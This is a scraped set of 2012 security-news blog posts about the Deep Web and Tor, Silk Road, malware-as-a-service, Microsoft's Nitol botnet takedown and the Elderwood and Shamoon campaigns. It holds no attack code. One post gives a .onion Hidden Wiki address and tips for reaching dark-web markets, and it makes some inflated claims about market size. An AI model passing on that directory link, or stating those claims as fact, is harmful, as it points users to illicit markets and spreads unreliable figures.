anonymity. This aspect makes very desirable the Deep Web for cyber criminals that in short time is moving all their activities in the dark world.\n\nBut consider also that the Deep Web is the privileged channel used by governments to exchange documents secretly, for journalists to bypass censorship of several states and also dissidents to avoid the control of authoritarian regimes\u2026 and these are just a few samples of not illicit use of the resources of the deep web.\n\nHow is possible that resources located on the web are not visible and which are the content of the hidden web? \n\nOrdinary search engines use software called \u201ccrawlers\u201d to find content on the web, they are computer programs that browse the World Wide Web in a methodical, automated manner and are mainly used to create a copy of all the visited pages for later processing by a search engine that will index the downloaded pages to provide fast searches.\n\nThis technique is ineffective in finding the hidden resources on the Web that could be classified into the following categories:\n\nThe  Tor Network, how to preserve the anonymity?\n\nTor is the acronym of \u201cThe onion router\u201d, a system implemented to enable online anonymity as part of a project sponsored the US Naval Research Laboratory from 2004 to 2005 and successively supported by the Electronic Frontier Foundation.\n\nActually the software is under development and maintenance of Tor Project. A user that navigate using Tor it\u2019s difficult to trace ensuring his privacy because the data are encrypted multiple times passing through nodes, Tor relays, of the network.\n\nTor client software routes Internet traffic through a worldwide volunteer network of servers hiding user\u2019s information eluding any activities of monitoring.\n\nHow does Tor network work?\n\nImagine a typical scenario where Alice desire to be connected with Bob using the Tor network. Let\u2019s see step by step how it is possible.\n\nShe makes an unencrypted connection to a centralized directory server containing the addresses of Tor nodes. After receiving the address list from the directory server the Tor client software will connect to a random node (the entry node), through an encrypted connection. The entry node would make an encrypted connection to a random second node which would in turn do the same to connect to a random third Tor node. The process goes on until it involves a node (exit node) connected to the destination.\n\nConsider that during Tor routing, in each connection, the Tor node is randomly chosen and the same node cannot be used twice in the same path. To ensure anonymity the connections have a fixed duration. Every ten minutes to avoid statistical analysis that could compromise the user\u2019s privacy, the client software changes the entry node\n\nUp to now we have considered an ideal situation in which a user accesses the network only to connect to another. To further complicate the discussion, in a real scenario, the node Alice could in turn be used as a node for routing purposes with other established connections between other users.\n\nA malevolent third-party would not be able to know which connection is initiated as a user and which as node making impossible the monitoring of the communications.\n\n\n\nIs it legal to surf in anonymity? Right to anonymity \u2013 Legal implications\n\nEvery day, all our web actions leave traces of ourselves and of our way of life through the storing of massive amounts of personal data in databases on the internet, all these information composes our digital identity, our representation in the cyber space.\n\nUsers are \u201centities\u201d in the cyberspace, built also with the correlation of data that increasingly escapes the control of the owner, anyone can theoretically \u201cexpropriate\u201d of our digital identity.\n\nToday tracking user activities on internet are one of the primary interests of private companies and Governments, business and political motivations are pushing for the development of monitoring and surveillance systems.\n\nAnonymous communications have an important place in our political and social discourse, many individuals desire to hide their identities because they may be concerned about political or economic retribution harassment or even threats to their lives.\n\nAnonymity is derived from the Greek word anonymia, meaning \u201cwithout a name\u201d, in the common usage the term refers to the state of an individual\u2019s personal identity, or personally identifiable information, being publicly unknown.\n\nIn internet the anonymity is guaranteed when IP addresses cannot be tracked, due this reason it has been assisted in the creation of Anonymizing services such as I2P \u2013 The Anonymous Network or Tor address. The anonymizing services are based on the concept of distribution of routing information, during a transmission in fact is not known prior the path between source and destination and every node of the network manage minimal information to route the packets to the next hop without conserving history on the path, the introduction of encryption algorithms makes impossible the wiretapping of the information and the composition of the original messages.\n\nThe Supreme Court of the United States has ruled repeatedly that the right to anonymous free speech is protected by the First Amendment. A much-cited 1995 Supreme Court ruling in McIntyre v. Ohio Elections Commission reads:\n\nProtections for anonymous speech are vital to democratic discourse. Allowing dissenters to shield their identities frees them to express critical minority views . . . Anonymity is a shield from the tyranny of the majority. . . . It thus exemplifies the purpose behind the Bill of Rights and of the First Amendment in particular: to protect unpopular individuals from retaliation . . . at the hand of an intolerant society.\n\nMany institutions and foundations, such as The Electronic Frontier Foundation, are spending a great effort to protect the rights to on-line anonymity.  As one court observed in a case handled by EFF along with the ACLU of Washington:\n\n\u201c[T]he free exchange of ideas on the Internet is driven in large part by the ability of Internet users to communicate anonymously.\u201d\n\nUS First Amendment settled that the right to speak anonymously, the Supreme Court has held,\n\n\u201cAnonymity is a shield from the tyranny of the majority,\u201d that \u201cexemplifies the purpose\u201d of the First Amendment: \u201cto protect unpopular individuals from retaliation\u2026at the hand of an intolerant society.\u201d\n\nCourt pronunciations establish the duty of government to guard against undue hindrances to political conversations and the exchange of ideas, a vigilant review that\n\n\u201cmust be undertaken and analyzed on a case-by-case basis\u201d.\n\nUS laws establish a right to Speak Anonymously on the Internet and also right to Read Anonymously on the Internet, ensuring the principle of free internet ideological confrontation and the right to free movement of information.\n\n \u201cPeople are permitted to interact pseudonymously and anonymously with each other so long as those acts are not in violation of the law. This ability to speak one\u2019s mind without the burden of the other party knowing all the facts about one\u2019s identity can foster open communication and robust debate.\u201d\n\nThe technological developments of recent years caused high attention to the legal and technological possibility to maintain the online anonymity, especially in the face of the multiplication of resources internet monitoring.\n\nThe right to internet anonymity is also covered by European legislation that recognizes the fundamental right to data protection, freedom of expression, freedom of impression. The European Union Charter of Fundamental Rights recognizes in Article. 8 (Title II: \u201cFreedoms\u201d) the right of everyone to protection of personal data concerning him.\n\nThe right to privacy is now essentially the individual\u2019s right to have and to maintain control over information about him.\n\nSailing in the dark\n\nAfter this necessary parenthesis on Tor network routing we are ready to enter the Deep Web simply using the Tor software from the official website of the project. Tor is able to work on all the existing platforms and many add-ons make simple they integration with existing applications, including web browsers. Despite the network has been projected to protect user\u2019s privacy, to be really anonymous it\u2019s suggested to go through a VPN.\n\nA better mode to navigate inside the deep web is to use the Tails OS distribution which is bootable from any machine don\u2019t leave a trace on the host. Once the Tor Bundle is installed it comes with its own portable Firefox version, ideal for anonymous navigation because an appropriate control of installed plugins, in the commercial version in fact common plugins could expose our identity.\n\nWell once inside the deep web we must understand that the navigation is quite different from ordinary web, every research is more complex due the absence of indexing of the content.\n\nA user that start its navigation in the Deep Web have to know that a common way to list the content is to adopt collection of wiki and BBS-like sites which have the main purpose to aggregate links categorizing them in more suitable groups of consulting. Another difference that user has to take in mind is that instead of classic extensions (e.g. .com, .gov) the domains in the Deep Web generally end with the .onion suffix. Following a short list of links that have made famous the Deep Web published on Pastebin\n\n\n\nCleaned Hidden Wiki should be a also a good starting point for the first navigations\n\nhttp://3suaolltfj2xjksb.onion/hiddenwiki/index.php/Main_Page\n\nBe careful, some content are labeled with common used tag such as CP= child porn, PD is pedophile, stay far from them.\n\nThe Deep Web is considered the place where everything is possible, you can find every kind of material and services for sale, most of them illegal. The hidden web offers to cybercrime great business opportunity, hacking services, malware, stolen credit cards, weapons.\n\nWe all know the potentiality of the e-commerce in ordinary web and its impressive growth in last couple of years, well now imagine the Deep Web market that is more than 500 times bigger and where there is no legal limits on the odds to sell. We are facing with amazing business controlled by cyber criminals organizations.\n\nThe dark business\n\nAs said the hidden web is considerable a wide marked covered by anonymity, a condition that make it attractive for the cybercrime industry that is moving its business in a region of cyber space where is really difficult to trace sellers and acquires, whatever goods they exchange.\n\nMajority of Deep Web know is just because they have read about the possibility to acquire weapons, malware and drugs in total security avoiding the control of law enforcement and far from any kind of limitations. In effect in several market place present in the dark web it is possible to acquire illegal odds and the press has made great advertising on this aspect, that is the type of news that people love to.\n\n\n\nOne of the most famous dark market is without doubt Silk Road web site, an online marketplace where the majority of products are derived from illegal activities. Of course it\u2019s not the only one, many other markets are managed to address specify products, believe me, many of them are terrifying.\n\nMost transactions on the Deep Web accept BitCoin currency for payments allowing the purchase of any kind of products preserving the anonymity of the transaction, encouraging the development of trade in respect to any kind of illegal activities. We are facing with an autonomous system that advantage the exercise of criminal activities while ensuring the anonymity of transactions and the inability to track down the criminals.\n\nRecently the Carnegie Mellon computer security professor Nicolas Christin published research on Silk Road and its business model, it seems that the market is able to realize $22 Million In Annual Sales only related to the drug market.  Total revenue made by the sellers has been estimated around USD 1.9 million per month, an incredible business also for the Silk Road operators that receive about USD 143,000 per month in commissions.\n\n\n\nThe experts have examined over 24,400 separate items sold on the popular site demonstrating that Silk Road is mainly used as drugs market, very interesting also the composition of the sellers that for obvious needs leaves within a couple of weeks the site to appear in second time.\n\nThe study has analyzed the evolution of the market in the last months demonstrating the increasing of the business may be obtained also thanks to the aura of mystery that many media give the Deep Web.\n\nThe number of sellers of any kind of drugs is passed from 300 in February to around 570 in August as reported in the following graph:\n\n\n\nWhich are the most sold products?\n\nThe study has grouped the product in categories and has revealed that the \u201cmost wanted\u201d items are drugs, following is proposed the list of the Top 20 categories in terms of items available.\n\nMost sellers leave the site fairly quickly, but a core of about 4% of them have been on the site for the entire duration of our study, the majority of sellers are only on the site for less than two months, may be because they leave the site once sold the products or because they move \u201cinto stealth mode as soon as they have established a large enough customer base\u201d.\n\nThe experts and law enforcement are conscious that are facing with an anomalous market where identities are hidden, payments difficult to trace, where no advertising is made and where the access to the \u201cmarket place\u201d implies anonymizing tool such as a Tor client. Despite all this consideration the study has revealed a string growth of the business, the market appears in expansion and number of sellers that use it is dramatically increased.\n\n\n\nChristin declared : \u201cIt\u2019s a stable marketplace, and overall it\u2019s growing steadily.\u201d\n\nBut many users on the site have worried for possible infiltration made by law enforcement, another source of concerns is that several of its high-profile sellers have disappeared. The possibility to infiltrate a similar market is concrete and market place such as Silk Road represents in my opinion a moderate risks for the worldwide community. The most problematic aspects of similar business is that they are controlled by criminal organization but the figure proposed are far from to justify a massive Government intervention,  the problem is how much hidden services like this are in the dark web?\n\nBut Deep Web is also famous because is the place where is relative simple to acquire malware and similar agents to realize cyber fraud, one of the most requested article are bot agents to be able to compose a botnet without particular knowledge.\n\nRecently I read of a botnet offering from the deep web describes many interesting technical characteristics. With just $8000 and three IP addresses it is possible to set up C&C, and get a personalized copy of the bot that has a hardcoded/obfuscated max of 10k zombies. I have no idea is the offer is real but is high probable that similar offers are daily available on deep web, we can imagine the impact on this wave of malware in the cyber space.\n\nWe have explained several time that a new model of business is growing around malware sells, old style criminals are investing in technology to expand their activities, they are requesting support and material to realize complex frauds, I introduced the term C2C (cybercrime to cybercrime) to describe the phenomenon of support provided by new cyber criminality  to ordinary crime.\n\nOne of the most famous malware sold in clear web which is \u201cmigrating\u201d to the deep web is the Citadel trojan, based on  the Zeus experience has evolved becoming one of the most interesting cyber criminal project. Security experts have found an excellent customer relationship management (CRM) model implemented by its creators. Thanks a malware evolution dictated by market needs, the trojan has evolved in time, many instances have been detected with different powerful features developed for specific clients.\n\nThe creators of the agent have structured an efficient service for the sale ( with sale price of nearly $2,500) and the supply of improvement services for the trojan through social network platforms.\n\nBut just one of the strengths of the model, the opportunity to get in touch with the  creators of the virus, paradoxically, could stop the spread of the dreaded malware.\n\nSo how to protect anonymity of the creators maintaining a malware as service selling model?\n\nDeep web gives a great opportunity, that\u2019s why Citadel\u2019s authors will probably migrate to the hidden web, trying to avoid the controls of law enforcement.\n\nThe need to restrict the audience of prospective customers could restrict the global business preserving its vitality. The anonymity is a need for cyber criminal, we have assisted to the proliferation of encrypted instant messaging communications and of VPN service providers, all to avoid to be spied on.\n\nCyber crime is characterized by a technical soul that is pushing the implementation of new hidden services deployed in the dark web, we are assisting to the consolidation of the black market, brokers can set up auctions to sell new malware and zero-day vulnerabilities ensuring the anonymity of the parties.\n\nDeep Web \u2026 a powerful analysis tool\n\nWe have seen that Deep Web thanks to anonymity and its dimensions represents a great opportunity for cyber criminal business it is also a powerful analysis tool.\n\nThe Tor Metrics Portal gives a set of useful the instruments to monitors the workload of the TOR networks, it proposes a complete collection of tools and documentation for statistical analysis regarding the activities of relays and bridges. These metrics could also be used for intelligence purpose, for example analyzing principal network metrics it is possible to investigate on the application of monitoring system inside a country for censorship purpose. Recently in many area of the planet similar systems have been used to suppress media protest and to persecute dissidents, avoiding the circulation of unconformable information outside the country. It is happened for example in Syria and in Iran, country where the control of the web is a major concern of the government. These situations are expression of a political sufferance of a country and could give a further element of evaluation to the analysts.\n\nAnalyzing the number of access to the Tor Network over the time it has been possible for example to discover how The Ethiopian Telecommunication Corporation, unique telecommunication service provider of the country, has deployed for testing purpose a Deep Packet Inspection (DPI) of all Internet traffic.\n\nUsing the metrics it was possible to identify the introduction of the filtering system as displayed in the following graphs.\n\n\n\nIt\u2019s simple to note that in the last week of May the Tor Network was not accessible from the country even with trying to use bridged access, evidence of the presence of filtering system for Deep Packet Inspection.\n\nDeep Web is not the hell\n\nAfter this overview I desire to explain to the readers that despite the Deep Web provide an environment to protect their privacy there are several conditions and different type of attacks that could expose user\u2019s identity. Governments are increasing their capability to monitor the hidden network, mainly trying to infiltrating them with spying services. In more than one occasion we have read of several U.S. cyber units totally dedicated to the monitoring if the Deep Web.\n\nWe have said that Deep Web is a creature desired by governments to allow to operate in totally anonymity, of course this aspect has been also exploited by cyber criminals, hacktivists and normal people who desire to defend their privacy, for this reason, institutions and agencies of every countries have promoted project to develop new monitoring systems and at same time they have started a misinformation campaign against the this parallel and hidden world.\n\nThe governments want you stay far from hidden web, because they cannot spy on you, the crime is present in deep web as in the clear web of course the anonymity granted by deep web could encourage and facilitate criminal activities but at same time it represent an obstacle to the criminal that for example desire to steal sensible information of the users or spy on them.\n\nMeanwhile on the clear web we are able to find many reports produced by security firms on cyber criminal activities and related earnings, we know relatively little about the profits related to the Deep Web that is characterized by a size and a criminal turnover dramatically greater than the one in the dark web.\n\nIn the meantime \u2026 don\u2019t believe to those that say you that Deep Web is the reign of the evil, because they are trying simply to defend their secrets keeping you away from that place.\n\n\n\nAbout the Author : Pierluigi Paganini, Security Specialist\n\nCEH \u2013 Certified Ethical Hacker, EC Council\n\nSecurity Affairs ( http://securityaffairs.co/wordpress  )\n\nEmail : pierluigi.paganini@securityaffairs.co\n\n \n\n(Security Affairs \u2013 Deep Web) \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymity", "topic_name": "anonymity"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deep-web", "topic_name": "Deep Web"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring", "topic_name": "monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/search-engines", "topic_name": "search engines"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/silk-road", "topic_name": "Silk Road"}]}, {"news_name": "Microsoft distrupts Nitol botnet, malware hidden in supply chain", "news_link": "https://securityaffairs.co/wordpress/8701/cyber-crime/microsoft-distrupts-nitol-botnet-malware-hidden-in-supply-chain.html", "title": "Microsoft distrupts Nitol botnet, malware hidden in supply chain\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 16, 2012", "body": "The malware diffusion is assuming dimension difficult to control, no matter if we are facing with a state-sponsored attack or with a cyber scam, malicious agents are around us, they have infected a huge quantity of machines with dramatic consequences.\n\nBut what\u2019s happen if we discover the malware inside the controller of ordinary object that surround us? What could happen if malicious code is installed directly in the factory?\n\nWe discussed several times regarding the alleged presence of backdoor inside Chinese network equipment, a nightmare that scare security experts and that could open the doors to disturbing incidents.\n\nSometimes the reality goes beyond the imagination, Microsoft in fact has published evidence of the presence of a bot agent  installed and hidden on personal computers  during their assembly in China.\n\nThe malware being pre-installed onto computers at the factories, this malware is loaded onto the computers before it reaches a customer or end purchaser. This means that the malware is loaded after the product is shipped by the original equipment manufacturer to a distributor, transporter, or reseller. \n\nMicrosoft, in particular its Digital Crimes Unit, has started the investigation in August 2011, naming the operation \u2018Operation B70\u2019, finding several brand new laptops and desktop PCs from various cities in China infected with backdoor and rootkit such as \u2018Nitol\u2019.\n\n\n\nThe blog post states:\n\n\u201cA supply chain between a manufacturer and a consumer becomes unsecure when a distributor or reseller receives or sells products from unknown or unauthorized sources. In Operation b70, we discovered that retailers were selling computers loaded with counterfeit versions of Windows software embedded with harmful malware.\u201d \n\nThe responsibles for the spread of malware in the supply chain had planned to build a large botnet to use to attacks their victims with DDoS attack or to spread other malicious agents.\n\nThe process of infection is really smart, the compromised factory made PC where used also as starting point for the infection, they were able to transfer the malware on every removable drives connected.\n\nThe domain, used as Command & Control server for Nitol agent, 3322.org, also hosted other 500 different strains of malware on more than 70,000 sub-domains to gain complete control of victims and to steal information.\n\n\n\nMicrosoft company has released the following declaration on the investigation made on supply chain security:\n\n\u201cWhat\u2019s especially disturbing is that the counterfeit software embedded with malware could have entered the chain at any point as a computer travels among companies that transport and resell the computer,\u201d\n\nThe study proposed by Microsoft on the event shown how cybercriminals exploiting a new way to spread malware preloading malicious code inside counterfeit software deployed onto computers that are offered for sale. To give an idea of the phenomenon 20% of the PCs researchers bought from an unsecure supply chain were infected with malware.\n\n\n\nLast week, the U.S. District Court for the Eastern District of Virginia granted Microsoft\u2019s Digital Crimes Unit permission to disrupt more than 500 different strains of malware discovered during the investigation, it is the second botnet disruption in the last six months operated by the company.\n\nThe action against the Nitol botnet is considered as part of a larger Project MARS (Microsoft Active Response for Security) Program to proactively eliminate malware threats that target its customers and MS services.\n\nThe scenario proposed is really worrying, the installation of a malware during manufacture raise the question on the security level ensured during the supply chain and the possible effect of a massive diffusion of agents spread using compromised machines.\n\nMicrosoft is one of the most active companies against the botnet diffusion, let\u2019s consider that these agents are mainly designed for Windows machines, the recent study on Cybercrime evolution in North America and Western Europe revealed in fact that most attacked OS are Windows, Android and Mac OS X.\n\nAn interesting initiative of Microsoft is that companies plans to give third-parties access to its botnet intelligence feeds through an API, CERTs, ISPs and even foreign governments could so benefit of the information provided by the firm, a first step in the fight of botnet.\n\nMicrosoft\u2019s Digital Crimes Unit (DCU) has announced that it is beta testing a system \u201cdescribed as a sort of real time honeypot that attempts to connect to and monitor bot  and C&C servers gathering data in traffic patterns\u201d.\n\nIn the future to avoid similar problems it is fundamental  that suppliers, resellers, distributors and retailers involved in the supply chain implement best practices to safeguard people from harmful counterfeit software.\n\n\u201cThey need to adopt and practice stringent policies that ensure that the computers and software they purchase and resell come from trustworthy sources. \u201c\n\nMicrosoft post conclude promising help to all its client providing information and tool to mitigate the incoming cyber threats.\n\n\u201cIf you believe your computer might be infected with malware, we encourage you to visit http://support.microsoft.com/botnets as this site offers free information and tools to analyze and clean your computer.\u201d\n\nMany sites report the news but no one has asked the question of who is responsible for the spread of malware \u2026 are we dealing with a simple criminal act or is there a responsibility of the government?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor", "topic_name": "backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/microsoft", "topic_name": "Microsoft"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nitol", "topic_name": "Nitol"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-b70", "topic_name": "Operation B70"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/supply-chain", "topic_name": "supply chain"}]}, {"news_name": "Elderwood project, who is behind Op.

The press is also convinced that other companies were targeted such as Morgan Stanley, Northrop Grumman and Yahoo.\n\nAurora attack is one of the most complex operation due the capability of attacker to exploit several 0-day vulnerabilities included one related the popular IE Explorer, in 2010 a notable zero-day exploit was linked to the group of hackers that used a Trojan horse called \u201cAurora\u201d diffused using an Internet Explorer (IE) zero-day, and targeted a large number of Western companies.\n\nAccording the security firm Symantec the hackers behind the attacks still have knowledge of 0-day vulnerabilities, and at least four of them have been used in recent attacks against different targets across strategic sectors such as energy, defense, aeronautics and financial.\n\n\n\nOrla Cox, senior manager at Symantec\u2019s security response division reported that it has been exploited at least eight zero-day vulnerabilities since late 2010, and four since last spring. She said:\n\n\u201cWe were amazed when Stuxnet used four zero-days, but this group has been able to discover eight zero-days. More, the fact that they have prepared [their attacks] and are ready to go as soon as they have a new zero-day, and the speed with which they use these zero-days, is something we\u2019ve not seen before.\u201d\n\nThe document of security firm reports:\n\n\u201cThis group is focused on wholesale theft of intellectual property and clearly has the resources, in terms of manpower, funding, and technical skills, required to implement this task,\u201d\n\n\u201cThe group seemingly has an unlimited supply of zero-day vulnerabilities.\u201d\n\nThe attacks part of the cyber espionage campaign discovered by Symantec has been named \u201cElderwood Project\u201d, for their execution have been exploited 0-day vulnerabilities in many large-use software including IExplorer and Adobe Flash Player.\n\n\n\nThe experts from Symantec declared that some of the exploits have been realized from the knowledge of stolen source code.\n\n\u201cIn order to discover these vulnerabilities, a large undertaking would be required by the attackers to thoroughly reverse-engineer the compiled application,\u201d\n\n\u201cThis effort would be substantially reduced if they had access to source code. The group seemingly has an unlimited supply of zero-day vulnerabilities. The vulnerabilities are used as needed, often within close succession of each other if exposure of the currently used vulnerability is imminent.\u201d\n\nThe attacks conducted during the recent months have been using an unusual method to infect the victims with a malware, it has been named \u201cwatering hole\u201d attack and consists to inject malicious code onto the public Web pages of a site that the targets us to visit.\n\nThe method of injection isn\u2019t new and is commonly used by cyber criminals and hackers, the main difference between their use in\ncybercrime and in watering hole attacks is related to the choice of websites to compromise and use in the attacks.\n\nThe attackers haven\u2019t indiscriminately compromised any website but they are focused choosing websites within a particular sector so as to infect persons of interest who likely work in that same sector and are likely to therefore visit related websites. The Symantec report states:\n\n\u201cTargeting a specific website is much more difficult than merely locating websites that contain a vulnerability. The attacker has to research and probe for a weakness on the chosen website.\n Indeed, in watering hole attacks, the attackers may compromise a website months before they actually use it in an attack. Once compromised, the attackers periodically connect to the website to ensure that they still have access. This way, the attackers can infect a number of websites in one stroke, thus preserving the value of their zero-day exploit. They are even in a position to inspect the website logs to identify any potential victims of interest. This technique ensures that they obtain the maximum return for their valuable zero-day exploit.\u201d\n\n \n\n\n\nOnce a victim visits the compromised site, the software for which the 0-days have been designed will make possible the infection of the machine.\n\nSymantec researcher have detected the use of this method using at least three different zero-day exploits in the last month.\n\nThe researchers believe that a specific platform has been implemented to conduct the operations, all the attacks use a  Trojan to infect the target computer that is packaged with a packer and also the address of the command-and-control (C&C) server. The delivery of the malware to the final victim is either though an email or a Web based vector.\n\n\n\nI opened the post supporting the idea that Aurora attacks are state sponsored, it\u2019s clear that I have no evidences for this, but the nature of the job made, the targets chosen  and the complexity of the operations make me believe that it is a result of a government project.\n\n\n\n \n\nThe unique certainty according Symantec is a connection between the most recent attacks and those used in attacks in 2011, demonstrable with common technical features and a noticeable similarity in the timing of the attacks and the types of vulnerabilities used between the 2012 and 2011 attacks.\n\n\u201cAfter this initial compromise, the attackers consolidate their beachhead and begin to analyze the stolen information, spreading through networks and maintaining access as needed. By analyzing the information gathered, the attackers can identify yet more targets of interest\u201d\n\nCox said Symantec has no hard evidence of this:\n\n\u201cBut this is a full-time job,\u201d\n\n\u201cThe work they do is both skilled and time consuming. They would have to work at it full time, so someone is paying them to do this.\u201d\n\n\u201cThe analysis has shown that certain organizations have been hit in different ways, indicating that they\u2019re of particular interest to [their paymasters],\u201d\n\nI leave you all the interpretations of Symantec expert, but I think that her thought is not far from mine.\n\nWaiting for further analysis any manufacturers who are in the defense supply chain need to be wary of these type of attacks. Subsidiaries, business partners, and associated companies are considerable priviledged targets, an easy way to break penetrate defense system of large companies\n\n\u2026 raise your guard the enemy may already be in. \n\nPierluigi Paganini\n\n(Security Affairs \u2013 Elderwood Project, Operation Aurora)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/0-day-vulnerabilities", "topic_name": "0-day vulnerabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/elderwood-project", "topic_name": "Elderwood project"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/google", "topic_name": "Google"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-aurora", "topic_name": "Operation Aurora"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attacks", "topic_name": "state-sponsored attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}]}, {"news_name": "Dangerous waves of malware are transforming cyberspace in a jungle", "news_link": "https://securityaffairs.co/wordpress/8497/cyber-crime/dangerous-waves-malware-cyberspace-jungle.html", "title": "Dangerous waves of malware are transforming cyberspace in a jungle\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 7, 2012", "body": "The cyberspace is becoming a jungle of malware, a place where the danger is just around the corner. Governments, cyber criminals, hacktivist and terrorist are focusing their activities in the new domain due this reason we are assisting to the born of new agents and very sophisticated attack tools.\n\nIn a parallel manner is lowering the level of technical knowledge required to carry out cyber attacks, a phenomenon that raises a lot of concern among security experts from around the world.\n\nIt is quite simple today to acquire all the necessary to compose a personal botnet or to commission online the creation of malware based on well know agents such as Zeus.\n\nAccording the last reports proposed by the main security companies there is no pace for every business sector, in particular banking and industry are the principal targets of the last wave of cyber attacks.\n\nThe number of attacks has increased dramatically according the cyber intelligence team at the Online Threats Managed Services (OTMS) group of RSA.\n\nIdan Aharoni, head of the cyber intelligence team for RSA\u2019s OTMS, announced the rapid explosion of the model of sell of  \u201cmalware as service\u201d in which every malware and attack tools sold is supplied by meticulous support services.\n\nAharoni also declared\n\n\u201cThe risk is huge. More criminals are able to target highly-sensitive information within companies,\u201d \n\n\u201cEven in businesses are not specifically targeted, they are still at risk and should ensure they are able to mitigate against the kinds of attacks we are seeing,\u201d \n\n\u201cOrganizations must have a plan for dealing with infections and data breaches; they can\u2019t just say this is an issue that doesn\u2019t affect me. Any company that stores data is a potential target,\u201d\n\nThe expert is referring the inadequacy of the current security defense mechanisms that daily are bypassed by new sophisticated cyber attacks.\n\nIt is a race against time, businesses and governments are exposed to serious risks, in particular the spread in the wild of agents of dubious origin represents a great cyber threat.\n\nIn the last months the number of cyber attacks related to cyber espionage campaign of governments is increased and some groups of researchers are sure that many other malware are silently operating in the cyberspace still undetected.\n\nThe impact on businesses by these agents is far from negligible, let\u2019s take as example the finding of Gauss Malware. After Duqu, Flame and Mahdi a new cyber-espionage toolkit has been detected always in the Middle East, and like its predecessors it is capable of stealing sensitive data such as online banking credentials, browser passwords and system configurations.\n\nGauss was discovered during investigation conducted by the International Telecommunication Union (ITU) to mitigate the risks posed by emerging cyber-threats, it has been detected thanks the investigation made to identify the Flame malware and according the investigations Gauss has been spread on September 2011 and was detected in June 2012 and on July it its command and control infrastructure shut down.\n\nThe discovery of Gauss let the experts believe that many other related cyber-espionage malware are actually in operation and many other agents will be developed in the next future.\n\nNews of these days are the continuous attacks to oil companies Saudi Aramco and RasGas, hit by the Shamoon malware.\n\nAfter a first wave of attacks it seems that newest attacks also use a more recent variant of the Disstrack malware.\n\nThe malware has destructive purpose, it attacks the system destroying system files, Master Boot Record and active partition of the disk.\n\nAccording to report with Symantec, first company to discover Shamoon on August, the malware has three primary functional components:\n\nAfter the initial infection, Shamoon spreads via network shares to infect additional machines on the network.\n\nThe wiper destroy the component following a prioritized list of files by overwriting them with a 192KB block filled with a partial JPEG image of a burning United States flag.\n\nFortunately several antivirus application are able to detect the agent and immunize the machine.\n\nI\u2019ve read on internet that some experts don\u2019t afraid a wide diffusion of those malware created by state sponsored projects, they believe that the agents are controllable and able to attack only specific targets within a specific area. I not agree this school of thought, Stuxnet is the demonstration that an agent can get out of control, out of the cage, and could attack also machines of the country of its creators, don\u2019t forget that cyberspace has no boundaries.\n\nInternet is profoundly changing, the services are changing, platforms are changing and also the cyber threats do the same evolving in complexity and frequency of attacks.\nThe impact of uncontrolled wave of malware is devastating, but contrary to what might believe, small business will be first impacted, and if the situation is not handled we find ourselves before a domino effect that could involve big businesses and governments in a defenseless cyberspace.\n\nPierluigi Paganini\n\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/banking", "topic_name": "banking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gauss", "topic_name": "Gauss"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mahdi", "topic_name": "Mahdi"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-as-service", "topic_name": "malware as service"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rasgas", "topic_name": "RasGas"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/saudi-aramco", "topic_name": "Saudi Aramco"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/shamoon", "topic_name": "Shamoon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/sophisticated-attack", "topic_name": "sophisticated attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, 